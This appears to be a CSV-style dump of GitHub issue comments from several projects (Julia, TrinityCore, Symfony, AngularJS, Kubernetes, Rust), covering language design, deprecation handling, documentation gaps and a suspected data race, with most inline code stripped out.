julia/JuliaLang/4935/47930916,"@friend What about this abstract AbstractTimeSeries  immutable AbstractTimeSeriesFields{T,N}     timestampVector{Dates}     valuesArray{T,N}     colnamesVector{UTF8string}     end  # Now there are all the methods that operate on an AbstractTimeSeries # they assume that every AbstractTimeSeries has a field ""base"" of type AbstractTimeSeriesFields # One example follow  length(tAbstractTimeSeries) = length(t.base.timestamp) # don't no if this is the correct length... but you get the idea  immutable TimeArray{T,N} &lt; AbstractTimeSeries     base{T,N}     # Might need a ""nicer"" constructor that hides AbstractTimeSeriesFields end  # Despite the constructor TimeArray needs 0 new methods  immutable FinancialTimeSeries{T,N} &lt; AbstractTimeSeries     base{T,N}     stockStock     # Might need a ""nicer"" constructor that hides AbstractTimeSeriesFields end  # Again all the AbstractTimeSeries methods are automatically available.  I don't think that there will be any performance hit in the indirection but if you are concerned about speed you have to benchmark it. ",,False,False,4935
julia/JuliaLang/4935/47933338,"@friend It is true that it is not such a good measure how often something comes up on the mailing list. Abstract multiple inheritance is something where no simple workaround is available and which is quite standard in other ""interface"" languages such as Java and C#. Further, there are some packages where this was/is really needed but the discussions where not on the mailing list but on github issues. After all we can duck-type as a valid workaround which leaves all type checking out however. But anyway, I am not a core dev and just wanted to convince you that the lack of abstract fields with types can be easily emulated with simple means and without cluttering the code. But since you are not convinced maybe the best way to get this in is to prepare a PR that implements this. I would vote for merging it in the case that overloading field access will stay unpossible. ",,False,False,4935
julia/JuliaLang/4935/53883831,This seems to have been fairly well-exhausted with the consensus leaning towards not having it. Objections to closing? ,,False,False,4935
julia/JuliaLang/4935/53897445,"It was my understanding that it was still under consideration, just not necessarily in the near future. That might also just be wishful thinking. ",,False,False,4935
julia/JuliaLang/4935/54823028,"I wrote a quick macro to do abstract types with fields on the user-side  very simple, and could probably use more work, but I think it's argument for not introducing 'Abstract Types with Fields' into the language directly (at least for now). If people want the feature, they can use it, and if it's considered useful enough, it's possible to reconsidered for inclusion into the language. On a side note, it would be nice if extra syntax was allowed for macros. Currently to use the macro you have to do It would look more seamless (and perhaps help testing new features) if I could write ",,False,False,4935
julia/JuliaLang/4935/54824685,"will work fine. Choose whatever macro name you want, of course. This is the approach we take in StrPack. ",,False,False,4935
julia/JuliaLang/4935/57919498,"No problem--what you've done looks pretty similar to what StrPack does now, in fact. ",,False,False,4935
julia/JuliaLang/4935/278174674,I guess with #20418 we could now consider ,,False,False,4935
TrinityCore/TrinityCore/15489/105922836,"Level 1 hunter, cannot equip weapons Troll Shaman Quest Proving Pit  to the Darkspear Jailor and nothing happens, quest is no initiated in the pit therefore it cannot be completed. ",,False,False,15489
TrinityCore/TrinityCore/15489/139416563,This issue is not considered valid because of the following reasons  No proper commit hash (revision)  Please read  . Thanks. ,,False,False,15489
TrinityCore/TrinityCore/15489/139416700,TBD 602 Rev 59eff3f This bot is rediculous lol ,,False,False,15489
TrinityCore/TrinityCore/15489/139418955,don't post multiple issues on one ticket. search before posting tickets. (duplicate) ,,False,False,15489
TrinityCore/TrinityCore/15489/139694094,"@friend ; the bot is not ridiculous, it points out that the first post of your issue is not properly written. If you don't follow the TC guidelines on how to post an issue, this is one of the consequences. ",,False,False,15489
TrinityCore/TrinityCore/15489/139723824,"its closed with Aokromes making his usual attitude and I am holier than though apprach, let it be that way. TC has been rushed and devs dont give a shit about us trying to learn ",,False,False,15489
TrinityCore/TrinityCore/15489/139726625,"Well, that is what I used to feel myself, especially regarding my own issues when posting a year ago. Seeing his comment today, from an outsider's viewpoint, his comment is neutral, short and to the point. ",,False,False,15489
TrinityCore/TrinityCore/15489/139727083,"well Ive searched for the issues that I have found on my 6x server, no answers no fixes, nothing yet I get told to search or go to this thread or that thread and yep, already been there and nope it doesnt fix a thing. How about they just own up to the fact that a start area is bugged or a a class is bugged and fix it rather than trolling forums or github trashing the novices. Tis the trouble with online communites, those who think that they are god and those who genuinely want to learn. I will wait patiently until 6x gets a lot more mature before I even try to play with it again. ",,False,False,15489
TrinityCore/TrinityCore/15489/139739092,"Your issues (2 issues) in the first post are duplicates. Example search  issues you can follow to see the progression on issue fixes [Quest] Proving Pit #11706  Fixed equip ranged weapons (Guns, throwns etc..) #14493  Hunter bug 6.x #15296 ",,False,False,15489
TrinityCore/TrinityCore/15489/139842493,"ok finally got it so hunters can equip, wondering why it doesnt give the hunter a cross bow or  a bow on initial load ",,False,False,15489
symfony/symfony/27936/340886172,"This RFC was prompted by the recent deprecations in various Doctrine projects, which now make some peoples' tests fail (example  For a Symfony project, the default value for the deprecation handler should be , not  - any deprecations within vendors are not within the scope of the application and thus shouldn't make tests fail. With Symfony Standard Edition being deprecated and Symfony Flex being the new Gold Standard (™️) I wasn't sure where to bring this up, so I thought I'd just ask around here. Would you be in favor for a change like that, and where would we make it? ",,False,False,27936
symfony/symfony/27936/404868364,"I've always been quite skeptical with weak_vendor mode. My reasoning is that you call the vendor code, so in the end there is no such thing as vendor-only deprecations. The example here is a good one thanks to the default mode, we identified quite early that Doctrine was in ""WIP"" state. Without this early notice, it could have been left unidentified for much longer, thus fixed much later. I think the current default encourages a constructive open-source attitude instead of having a ""not my fault"" attitude, it encourages ppl to own their vendor. That also works on Symfony since we decided to build on top of Doctrine, we own a responsibility here also and keeping eyes actively open on the project is vital for the ecosystem. ",,False,False,27936
symfony/symfony/27936/404880331,"Can you please explain what exactly was WIP there? Two new silent () deprecations appeared in dev version, for two classes deprecated ~6 years ago, and some more using phpDoc annotation . Although I agree that in the ideal situation the usage of deprecated classes shouldn't have existed by the time, I disagree with your actions regarding #27609 (the revert + discussion) where you discarded the work solely because of not-yet-migrated usage coming from a yet another development version. Yes. And everything would work as before. It's not a bug, using deprecated API doesn't inherently break anything and the deprecated API stays in place until end of minor version (semver-compatible approach). This is not relevant to whether  is / should be default or not, you can opt in for such behavior regardless. The deprecations using  are called opt-in, but with your assumptions, you are actually making opt-in deprecations opt-out. Sadly this completely breaks the original concept of _opt-in_ness - these deprecations are no longer opt-in since you force everyone to opt-in and comply. In the end what you are saying is in contradiction with Symfony's converntions I agree it's everyone's responsibility to keep an eye on the vital state of their dependencies. I agree it's a common interest to forward any breakages / incompatibilities / bugs to the maintainers of the dependencies in question as soon as discovered. I do not agree that silent/phpDoc deprecations should be something covered by any of these. Which brings me back to ♠@friend_vendors`, there is still a notice for deprecations happening in vendors.) ",,False,False,27936
symfony/symfony/27936/404931053,"@friend usage of the listener reporting deprecation and making tests fail for them is the opting in. This listener is optional, and deprecations are not making the testsuite fail if you don't have it. ",,False,False,27936
symfony/symfony/27936/404935867,"Is it really though? Only having the package installed seems it gets enabled automagically in the report everything mode  installed it in a project without previously having the bridge (try yourself on doctrine/orm2.6 for example), didn't change phpunit.xml at all, but  suddenly ends with exit code 1 and summary of deprecations. ♠composer create-project symfony/website-skeletonsymfony/phpunit-bridge` automatically. This is not opt-in. ",,False,False,27936
symfony/symfony/27936/404939970,This should be considered on the recipe for the bridge I suppose. ,,False,False,27936
symfony/symfony/27936/405026645,"There should absolutely be no such thing, but unfortunately, it turns out people make mistake, and both the caller and the callee (which triggers) will be in the same Composer package.  was made to help libraries avoid that kind of mistake, which results in ""unfixable deprecations"". ",,False,False,27936
symfony/symfony/27936/406898585,"As I understand, the only way to silence these errors is to use an environment var , but I have opened as issue as this still doesn't silence them as it appears that during simple phpunit bootstrap, getenv is not able to access the  vars - ",,False,False,27936
symfony/symfony/27936/407143521,"I was not sure what  meant, but now that I checked the code and chatted a but with @friend, I pretty confident we should not do this  ignores any deprecations thrown by any vendor; it keeps only deprecations thrown by your own . That's not something apps should do. For libs, it may make sense of course. For this reason, I'd be -1. ",,False,False,27936
symfony/symfony/27936/407184924,"After a constructive discussion on Slack with @friend, I updated my understanding of the topic. What want here is that their CI don't fail on deprecations. While this lowers the urge to contribute fixes to vendors that trigger their deprecations, this may be more compatible with daily job tasks. So here we are  doesn't use  because this mode is meant for libs. Instead it uses a maximum number of deprecations. But the end result is similar the CI won't fail by default, but the deprecation summary will still be printed. ",,False,False,27936
symfony/symfony/27936/411973749,I believe the solution implemented now is a good compromise. People can still complain about the deprecations or (ideally) fix them upstream without the deprecations disrupting their daily workflow. Thanks @friend! ,,False,False,27936
angular.js/angular/1438/7334618,"The sample code for  is broken. See the first comment for a fix     You must reference the angular-resource js script file.    Then you must declare a module dependency on     'ngResource' via angular.module('myapp', ['ngResource']). ",,False,False,1438
angular.js/angular/1438/9641795,This URGENTLY needs to be fixed.  People keep getting stuck on this issue. ,,False,False,1438
angular.js/angular/1438/9801367,"Yeah, count one more person who wasted time on this. You can eventually figure it out by searching around the net and reverse engineering other peoples code ) ",,False,False,1438
angular.js/angular/1438/10660313,"plus one, just lost an hour wondering about this too. ",,False,False,1438
angular.js/angular/1438/10921627,Ran headfirst into this one as well. ,,False,False,1438
angular.js/angular/1438/11217132,plus one me too. Thanks ,,False,False,1438
angular.js/angular/1438/11394570,It's open issues like this that make me wonder if I should continue developing with Angular. I mean this with 100% respect for what you all have accomplished here.  I'm just trying to point out that documentation is really important for people like me who are trying to choose which framework to use. ,,False,False,1438
angular.js/angular/1438/11410346,Fork. Branch. Fix. Pull request? ,,False,False,1438
angular.js/angular/1438/11411523,"So, had a look at this example and it is broken in number of ways, in addition to the ones already listed  It is still using old controller syntax ( instead of ) We are missing a module with a resource created in a factory Google buzz is gone ( so the example must be changed anyway  I don't know, if there are no other ideas we could simply change it to the projects list from the home page.. ",,False,False,1438
angular.js/angular/1438/11993003,why are you doing this to us? ,,False,False,1438
angular.js/angular/1438/12001717,Angular.js has over 700 closed pull requests. Just saying. ,,False,False,1438
angular.js/angular/1438/12001867,but this is really urgent. I couldn't find any advanced example for $resource. ,,False,False,1438
angular.js/angular/1438/12006311,Normally I agree with the philosophy if you find a problem why not propose a solution. However this is one of the first things people new to angular are trying to grok. They are thinking more WTF rather than how can I fix this.  Let them get through hello world before expecting pull requests. ,,False,False,1438
angular.js/angular/1438/12033240,"I went through hello world 6 months ago. I have made 3 productive angular apps, yet I spent a full day trying to figure out how $resouce works basically. WTF ",,False,False,1438
angular.js/angular/1438/12038315,"@friend @friend I sympathise completely, it's always fair to raise a ticket to ask an expert to fix a problem. What's not fair (or helpful) is the attitude that ""WTF"" conveys. This is free software, built with the time and creative energy of individuals who ask for nothing in return. They deserve a little better than ""WTF"", don't you agree? When I hear that attitude my gut reaction (that I do usually restrain) is ""fix it yourself"". ",,False,False,1438
angular.js/angular/1438/12038439,I apologize. I was unrightfully  provoked. Sorry! ,,False,False,1438
angular.js/angular/1438/12044431,"Yes Richard you are right. I guess a bit of frustration comes from not having more access to what the core team is thinking.  Not for our curiosity but because it would help us plan ways to help the project.  Are any if the core team working full time on Angular?  (if they have only 10% allocation we can optimize our help for this)  What are they currently working on or starting in the near future?  (sparse commits and roadmap don't tell much)  How do we contact them?  Does Igor list his email?  I am trying to help fix a bug in the core code and need to coordinate but haven't gotten a response via GitHub or google groups.   Leaders of a free project do deserve our respect and thanks.  The flip side is they have to spend time on communication, coordination, and leadership, or delegate it.  The more the path is lit the more the community can help. On Jan 9, 2013, at 414 AM, ""Richard Marr"" notifications@friend.com wrote ",,False,False,1438
angular.js/angular/1438/12045657,Fair enough! ,,False,False,1438
angular.js/angular/1438/12081539,Something as basic as $resource should be properly documented. WTF is the appropriate reaction. Fixing it yourself is too. ,,False,False,1438
angular.js/angular/1438/12198587,"I would like to contribute more appropriate documentation and samples, but I couldn't figure how to make the sample code pipeline work. On Wed, Jan 9, 2013 at 942 PM, Iwein Fuld notifications@friend.com wrote ",,False,False,1438
angular.js/angular/1438/12208705,"kmayer cool! What do you mean by ""how to make the sample code pipeline work""? Is it related to the Angular build, or to the code that is in the current sample? I think that you can best ask in the mailing list, there is quite a bit of activity there. ",,False,False,1438
angular.js/angular/1438/18803220,This should have been closed 3 months ago together with Pull Request #2099 . Here an screenshot showing this info on the current docs of ngResource.$resource    ,,False,False,1438
angular.js/angular/1438/23198797,"As part of our effort to clean out old issues, this issue is being automatically closed since it has been inactivite for over two months. Please try the newest versions of Angular ( and ), and if the issue persists, comment below so we can discuss it. Thanks! ",,False,False,1438
julia/JuliaLang/1374/7561352,"As I understand it,  is supposed to return an in-place  it outputs such a type, but its value stays as . Also, only the upper diagonal elements are changed, the lower diagonal elements are those of the original matrix. ",,False,False,1374
julia/JuliaLang/1374/9404206,"It's not possible to change the type of something in-place, so the behavior expecting isn't actually feasible. Perhaps this is an indication that  simply shouldn't exist since its behavior can't be made to match that of its non-in-place counterpart. ",,False,False,1374
julia/JuliaLang/1374/9404212,cc @friend ,,False,False,1374
julia/JuliaLang/1374/9404655,"""its value stays as an array"" CholeskyDense is a composite of two objects, and Array and a Bool. In that output, you're seeing those two components (note the ""true"" at the end). What's possibly confusing is that that CholeskyDense is designed to act as a decomposition of A, in other words be interchangeable for A when used in linear algebra. For example In other words, this test shows that it's working as intended. If you want the Cholesky factor, used factors(C). Or just call chol(C). ",,False,False,1374
julia/JuliaLang/1374/9404680,"Ah, clever. So the  version basically uses the input array as a computational scratchpad but returns the decomposition still. ",,False,False,1374
julia/JuliaLang/1374/9404856,I get the decomposition thing---that's really quite useful---I guess I just expected  to have the same result as . ,,False,False,1374
julia/JuliaLang/1374/9405303,"I see your point, and it's a good one. (It took me a little to understand that was probably your thinking, sorry about that.) But as Stefan said, it's not possible. I guess ! also means ""caution!"" in this context -). ! is actually pretty ambiguous some functions have ""dummy"" inputs that really serve as outputs, for others (like sort!) they are genuine inputs and the output is returned in them, and yet others just use their inputs as scratch space. I have wondered about using chold!! on occasion, but in the end any naming convention will break down for functions that have multiple inputs and do different things to them. I just noticed that your comments also point out that chold! is not quite working in place. The call to Lapack is in-place, but then it's calling triu or tril which creates a new matrix. So we have the worst of all worlds, it destroys the input but it also allocates a new matrix, which therefore doesn't really represent a savings. I just pushed a fix for this issue. ",,False,False,1374
julia/JuliaLang/1374/9405559,"So does that mean  won't need to create a new array in memory? If so, that's very handy. ",,False,False,1374
julia/JuliaLang/1374/9405732,Correct. ,,False,False,1374
julia/JuliaLang/1374/9405753,"Indeed, I should say that C = chold!(A, true) also doesn't create a new array in memory. I would be tempted to rename it. I'm not sure (others could tell you with certainty), but I wonder if having variables change type in the middle of a function is less-than-ideal programming practice from the standpoint of making life easy on the compiler. ",,False,False,1374
julia/JuliaLang/1374/9406643,"It depends. If  is just an identifier, in  you're binding something new to it so it's as if you've really called it  and you call it that for the rest of its scope (which if I understand correctly is conversion to a static single assignment (SSA) representation.) Compilers figure that out. This is different than mutating the value of  into something with a different type, which is what the hypothetical side-effectful  would have to do. As Stefan mentions, that can't be done, since the type of a value can't be changed. Note that I was very careful to completely avoid the word ""variable."" ",,False,False,1374
julia/JuliaLang/1374/9476117,An alternative would be to use a type to indicate that an object is allowed to be destroyed The exclamation mark could then be reserved for functions that do in-place modifications such as . ,,False,False,1374
julia/JuliaLang/1374/9491984,"That's not a bad idea. I'm a bit used to knowing that ! means I'd better read the documentation on a function, so I don't think this is essential, but it might mean fewer trips to the docs. That certainly has merit. What do others think? ",,False,False,1374
julia/JuliaLang/1374/9494107,"My attitude was much like yours, @friend.  The  in the function name is a sign of danger in that the function can modify its arguments.  That's why almost all the functions in the Blas and Lapack modules have names ending in . To me it is a sign to the casual user that such functions should be avoided.  The expert user who has read the docs can employ such functions to overwrite arrays thereby saving storage and enhancing performance but they should not complain about subtle bugs in their code introduced by the contents of arrays being changed. So I think that the  means, ""you better read the docs carefully before using this function"". ",,False,False,1374
julia/JuliaLang/1374/9518137,"Yes, I think you're right about the  indicating danger, and hence requiring the user to read the documentation. But not all functions that destroy their arguments do (and can) have exclamation marks (Although maybe this example is a bit far-fetched.) ",,False,False,1374
julia/JuliaLang/1374/9527605,"Right. That's a different but related convention, which is that when you give constructors an array, they ""own"" it. Of course, this is to avoid having to make copies of everything, but it can definitely be a usability issue. ",,False,False,1374
julia/JuliaLang/1374/9532888,"As an inner constructor the function  must have the same name as the type so the only way to insert a  in the name is to change the name of the type as well.  Although we expect that it will be very rare to call the inner constructor for a templated class directly, all the other constructors do end up calling the inner constructor eventually.  Thus we are left with the option of mangling the name of the type, potentially confusing some users, or forcing a copy of the argument in the inner constructor.  The latter choice would mean that all such objects would cause a copy of the matrix, which is a situation I would like to avoid.  I would prefer to provide the ability to modify the array in place if the programmer so chooses. All the Factorization types eventually call Lapack subroutines to generate the decomposition.  These subroutines always overwrite some of their arguments, hence the option for overwriting is available.  Saving memory allocation and garbage collection by overwriting is not important when dealing with arrays with tens or hundreds of elements.  It is important when dealing with arrays having tens or hundreds of millions of elements.  I write code that performs iterative optimization of parameters in models that can have matrices of this size in their representation and these arrays need to be updated at each evaluation of the objective function.  I really want to do that updating in place.  In fact, in the R code for these models that I currently have available, I go to a lot of trouble and complication linking compiled code with R code and passing objects that should not be modified but are, exactly to allow for in-place updating.  In early versions of that code (the lme4 package for R) users had the experience of getting models fit and then having R fail because it is unable to allocate memory to construct the object to be returned from the model-fitting function.  In other words, the results were calculated but could not be returned because of a copy operation. They weren't happy. ",,False,False,1374
julia/JuliaLang/1374/9534620,"I think David's point is that you could, if you chose, have the following behavior CholeskyDense{Float64}(A, true) makes a copy of A (so doesn't destroy it). In contrast, CholeskyDense{Float64}(destroy(A), true) does not copy of A, because you've marked A as being something you don't care about preserving, and uses A for its storage of the decomposition. However, I agree with Stefan it's probably a good convention that when you pass things to a constructor, you're passing control of them to the new object. I think I follow that pretty naturally in my coding, but I suppose this is yet another chance to ask whether we need more documentation. ",,False,False,1374
julia/JuliaLang/1374/9557421,"@friend, that's indeed what I meant. The convention of passing control of the arguments in a type constructor to the type does seem to make a lot of sense, however. Adding Destroy methods everywhere would probably be too verbose. ",,False,False,1374
julia/JuliaLang/1374/9596793,"If I have a triangular matrix, is there a way to construct a  instance? As I understand it, the constructor only accepts the full matrix, and then computes the Cholesky decomposition. But what if I already have the Cholesky decomposition computed? This could be useful for sampling from Wishart (and inverse Wishart) distributions, which can be done via a Bartlett decomposition. ",,False,False,1374
julia/JuliaLang/1374/9602393,"@friend At present the  constructors perform the decomposition.  You could always create a  object of the appropriate size as, say,  then replace the matrix as Actually, now that I think of it there is no need to match the size of the matrix used to create Lapack.potrs!♠ directly if you want to solve systems of the form LL'x=b ",,False,False,1374
julia/JuliaLang/1374/9602505,"@friend Regarding adding Destroy methods everywhere, I think it make much more sense to call  than to try to do a lot of gymnastics within a function to have  work. ",,False,False,1374
julia/JuliaLang/1374/9602861,"@friend Thanks. You can actually call , and then replace it with a larger matrix to save having to compute the Cholesky of the identity. However, perhaps it would be better if the constructor for  didn't compute the Cholesky at all i.e. calls to  would take the triangular matrix as the argument. You could transfer the computation to the  function, or use ? This would have the benefit of being consistent with some of the other  types, such as  and . ",,False,False,1374
julia/JuliaLang/1374/9602914,"Actually, I just realised  isn't a subtype of  why is that? ",,False,False,1374
kubernetes/kubernetes/56026/275206867,"Is this a BUG REPORT or FEATURE REQUEST? /kind bug /area hw-accelerators /sig node What happened When re-writing the endpoint code I discovered that the mutex logic is wrong and can lead to a data race while calling the  function. The current logic is a bit convoluted and would make more sense if the map was created in the for loop. However it seems like once the map is assigned to the structure, a device update while calling the  function will lead to a data race, Anything else we need to know? cc @friend ",,False,False,56026
kubernetes/kubernetes/56026/345571373,"Not quite sure about the race scenario you described, which func do you mean by  function ? The  ? ",,False,False,56026
kubernetes/kubernetes/56026/345783837,"Did you mean manager.Devices by ?  map is being assigned to  structure with locking protection only. Did you want to say that a race will happen if  is being updated and at the same time  gets invoked? If yes, i dont think so. At both the places, first endpoint.mutex lock is taken. So only one can run at a time and other will wait on mutex. Please let me know if i mistaken something. ",,False,False,56026
kubernetes/kubernetes/56026/345876157,Sorry I meant  essentially though the manager.Devices function calls the endpoint.getDevices(). Yes thanks for clarifying this. ,,False,False,56026
kubernetes/kubernetes/56026/352045327,I believe we all agree that there is no race in the scenario described in the description of this issue. Shall we close this issue? ,,False,False,56026
kubernetes/kubernetes/56026/352048547,@friend there is a race I think I didn't fully read your answer at the time sorry. Because the way maps works when replacing the map in the structure I am now making the Endpoint's map to the local copy of . Which means that every time we lock in the  function we might be changing that copy underneath. ,,False,False,56026
kubernetes/kubernetes/56026/352392486,@friend thanks! I got confused b/w call-by-value and call-by-reference and forgot that in golang maps are call by reference. ,,False,False,56026
rust/rust-lang/44524/257144780,"This is a tracking issue for the RFC ""In-band lifetime bindings"" (rust-lang/rfcs#2115). Steps  [ ] Implement the RFC (cc @friend/compiler -- can anyone write up mentoring instructions?) [ ] Adjust documentation (see instructions on forge) [ ] Stabilization PR (see instructions on forge)  Unresolved questions  Is a lint for enforcing multi-character lifetime names in impl headers worthwhile?  ",,False,False,44524
rust/rust-lang/44524/328950131,"@friend Could we word the unresolved question as something like ""what is the appropriate convention, if any"" rather than ""is this particular convention worthwhile""? Thanks! ",,False,False,44524
rust/rust-lang/44524/328953287,"also, that wasn't the only suggested alternative. There is also completely explicit lifetimes using ",,False,False,44524
rust/rust-lang/44524/328955959,"This lint is going to require updating a lot of code, including all of our docs and examples. I guess you could just do  but that seems to miss the point. Could we make some kind of interactive rustfix tool to let you choose new lifetime names and have them automatically updated? ",,False,False,44524
rust/rust-lang/44524/328968029,"@friend Done, thanks! ",,False,False,44524
rust/rust-lang/44524/328981508,I expanded the unresolved question a bit. ,,False,False,44524
rust/rust-lang/44524/329008971,On the shadowing issue would it be acceptable to simply disallow the shorthand when there are lifetimes in enclosing scopes? ,,False,False,44524
rust/rust-lang/44524/330299910,"(Partiall) mentoring instructions I'm not sure 100% the best way to implement this yet, but let me start by giving some pointers. Perhaps @friend can elaborate, as he is the last one to touch the relevant code in a serious way, as far as I know. First thing is a kind of list of what the tasks are in the RFC. This is roughly the order in which I think we should approach them. It may even be worth breaking this out into  [ ] Implementing . [ ] Lint against single-use lifetimes (they should be replaced with ). [ ] Enable implicit binders. [ ] Apply to rustc, experimenting with naming conventions (e.g., working through the affect on rustc).  I don't have time for detailed mentoring notes, but here are a few things to start reading into. At present, region resolution etc kind of works like this  During HIR lowering, we insert placeholders for elided lifetimes. After HIR lowering, we run the code in .  This creates the  that, for each , contains a  struct indicating what region is being named. This struct is a bit complicated. =)    ",,False,False,44524
rust/rust-lang/44524/330352095,To support  we have to do very little  treat it like the existing placeholder lifetimes in  remove the error for literally using  as a lifetime  ,,False,False,44524
rust/rust-lang/44524/346608704,"Sorry that I come “after the battle” (this RFC was accepted during the pre-impl-period rush), but as @friend pointed out applying this lint to existing code bases will likely generate a lot of busy work for questionable benefits. I looked for the rationale for this lint but couldn’t find it.  mentions a “convention”, but doesn’t say why enforcing it is important enough to warn by default. We don’t have such a lint for local variable names or field names, for example. I assume that proposed lints are intended to warn by default. If they’re silent by default I have no concern. ",,False,False,44524
rust/rust-lang/44524/346744471,"The idea is that there will no longer be  sections in functions, so it will be harder to tell apart lifetime names from  scope and those from function scope. This makes it tricky to know whether a name used in a function is intended to refer to an -scope lifetime, or to define a new one (and should thus be renamed). ",,False,False,44524
rust/rust-lang/44524/346749516,"@friend Sorry, I have a hard time figuring out if your comment is arguing for or against something, and whether that thing is the lint I mentioned or some other change proposed by this tracking issue. ",,False,False,44524
rust/rust-lang/44524/346758955,"@friend It's just trying to describe the reasoning behind the lint's existence, not necessarily argue for or against it. ",,False,False,44524
rust/rust-lang/44524/346760900,"Alright, I understand your previous comment now. I still think that while it might be good to nudge in that direction when writing new code, spewing hundreds of warnings in existing code bases is counter-productive. ",,False,False,44524
rust/rust-lang/44524/351827005,"What is the desired behavior for  in trait objects? Currently, it behaves just like elided lifetimes and is ignored. I think we want to change this. For example I would personally expect that the second and third versions would be equivalent. ",,False,False,44524
rust/rust-lang/44524/366471309,Could we upgrade the  lint to  when the  feature is turned on? ,,False,False,44524
rust/rust-lang/44524/366471503,"I think it should follow the same rules as all elisions in return types roughly, if there's only one input lifetime, match that one, if its a method, match the method receiver, otherwise, new lifetime. So yea, this example should be equivalent. ",,False,False,44524
rust/rust-lang/44524/366550682,"Unless they can only occur when using unstable features, please only enable new warnings after the alternative becomes available on the stable channel. (At least.) ",,False,False,44524
rust/rust-lang/44524/366551009,"@friend I'm not sure I understand you, but I think you're saying that we should not enable lints when you turn on a nightly feature unless the code being linted would not be possible without that nightly feature. Can you elaborate way? ",,False,False,44524
rust/rust-lang/44524/366551631,"I mean that Nightly should only warn ""Don’t do X, do Y instead"" once Y becomes available on the Stable channel. This is so that a project (for example a library) can choose to support all three release channels and be able to compile without warnings in all of them. An exception to that is if X was unstable, such that code that uses it could not build on Stable anyway. ",,False,False,44524
rust/rust-lang/44524/366551800,"@friend the intent is to turn the lint on when the feature is turned on (not on all nightlies). You can't have a feature turned on and compile on stable. I understand that when we stabilize the feature, we should not have the lint level follow it until the feature is actually in stable. ",,False,False,44524
rust/rust-lang/44524/366551954,"And this should be a minimum. If X is extremely common, consider only warning by default in a new epoch. It’s not nice when a large project suddenly starts emitting hundreds of warnings just by switching to a newer compiler. ",,False,False,44524
rust/rust-lang/44524/366752952,"@friend unfortunately, I think there are still some bugs we need to fix before we upgrade the lint. For example, I found that I was getting warnings in the  macro. I've been meaning to file an issue about that. ",,False,False,44524
rust/rust-lang/44524/366797073,Good to know. My reason for prioritizing upgrading the lint is that alexcrichton/futures-await#63 requires users to use  for lifetimes in paths for async functions. This is because we have to unelide lifetimes in a proc macro to add them to the  return type. It seems easier for people using this syntax to just move everything over than to have to use  sometimes and not other times. ,,False,False,44524
rust/rust-lang/44524/367125980,This is the problem I was talking about ,,False,False,44524
rust/rust-lang/44524/368019707,"I created a distinct tracking issue  for , which we aim to stabilize first. @friend, I also filed a bug regarding the behavior of `dyn Trait (and linked it from #48469). ",,False,False,44524
rust/rust-lang/44524/371155760,Am I wrong in assuming that we are just experimenting this feature since there are still concerns from the RFC thread? Or is this a feature that is very likely to get stabilized without overwhelming consensus? ,,False,False,44524
rust/rust-lang/44524/371249607,"That seems to be the case  the same time, though, features get stabilized without ""overwhelming consensus"" all the time. Rust language design isn't a popularity contest. ",,False,False,44524
rust/rust-lang/44524/371421159,"Nothing is a popularity contest. This does not mean users' legitimate concerns should get ignored in the discussion of a change that has significant impact on them. In the end of day though, team member still decide what to do and what not to do, and users continue to reply on team members' effort to produce useful things. And I personally feel torn between sounding confrontational possibly ungrateful and letting changes I think that may undermine a system language that focuses on correctness and promises boring stability slip through. ",,False,False,44524
rust/rust-lang/44524/371533499,"@friend Yes and no. I don't think that this feature has yet been evaluated, so that part I agree with. This is mostly due to general lack of bandwidth I would say. I am hoping that will change as get more organized about ensuring all the pieces of the upcoming Epoch (or era, edition, whatever) fall into place. Regarding the feature itself, I personally still feel quite positive about it. I've used it in a few small places and it felt very natural. But I wouldn't feel comfortable recommending or stabilizing it until (a) it is feature complete, (b) in use at least in rustc and ideally other places, and (c) there are effective lints that guide us down the expected path. That said, I do feel good about stabilizing  specifically, which more-or-less meets those criteria (still a bit of work to be done). ",,False,False,44524
rust/rust-lang/44524/371699138,"I've recently written rather a lot of code where implicit binders would have been rather nice... basically, I have a bunch of containers with methods like ",,False,False,44524
rust/rust-lang/44524/371702133,"@friend Isn't that one of the cases that elision handles, since  is single-use and the return is borrowed from ? ",,False,False,44524
rust/rust-lang/44524/371850211,"Sorry, bad example. It's more complicated when there are other lifetimes on the  type that you want some parameters tied to. Also, I can never quite remember when they can be ellided or what the inferred lifetimes are, so I find the explicit lifetimes convenient when it's not obvious. ",,False,False,44524
rust/rust-lang/44524/385288803,It looks like #48469 and #15872 are done tada  Could someone update the OP? ,,False,False,44524
rust/rust-lang/44524/399601550,"🔔 🔔 Note that an early 2018 Edition Preview is now ready, and includes in-band lifetimes. Please take a look and leave feedback here! ",,False,False,44524
rust/rust-lang/44524/405362435,"On discord recently, someone said And I'm able to confidently say, ""You don't need the "" and suggest With in-band lifetimes, if someone says I can no longer make that statement confidently. Has there been any further progress on how to apply this only in ways/places that doesn't potentially increase confusion?  My first instinct is something like ""cannot mix in-band and from-parent lifetimes"", but that still doesn't make the third code example earlier unambiguous... ",,False,False,44524
rust/rust-lang/44524/405424571,"I see this more as a style issue. If you are mixing parent and function lifetimes, I think you should not use in band lifetimes. In my limited experience, this mixing case is uncommon so the loss of ergonmics seems justified. ",,False,False,44524
rust/rust-lang/44524/405428196,"I think that this ship has sailed for other similar concepts. If there's a trait bound on the  block, you don't see it from the method. Whenever trait bounds are implicitly applied on the  block based on the type declaration, there will be even more ""action at a distance"". ",,False,False,44524
rust/rust-lang/44524/405489909,I think we should just add a lint already for one-use lifetimes. ,,False,False,44524
rust/rust-lang/44524/405761976,"How much has this feature been put into use in rustc at this point? That's one of the items listed in the OP, curious what the experience has been. ",,False,False,44524
rust/rust-lang/44524/405800749,"I'm happy to stabilise but not strongly so - I found in-band lifetimes to be of limited utility, iiuc the current design only lets us skip declaring a lifetime, so it just saves  or similar. I find the declaration necessary only rarely and when it is necessary it's usually a complex signature where the decl doesn't make too much difference. I didn't use the impls thing so much, but that sounds much more useful. ",,False,False,44524
rust/rust-lang/44524/405812467,"I don't think it's good to defend action-at-a-distance by saying there's already some in the language and we're (probably) going to add more. Lifetime annotations are really confusing, especially for newcomers, and making them harder to trace should be considered very carefully. ",,False,False,44524
rust/rust-lang/44524/405813992,As a clarifying question what was the decision on single-letter lifetimes in general? There are several unchecked boxes in the top post before stabilization and that's one of them. ,,False,False,44524
rust/rust-lang/44524/405826949,"Just to confirm something, do we already have the lint for ""you only used this lifetime once, so it's probably a typo""? I don't want to stabilize this without the typo-catcher. ",,False,False,44524
rust/rust-lang/44524/405850532,We could just make this a hard error requiring  to be used instead ,,False,False,44524
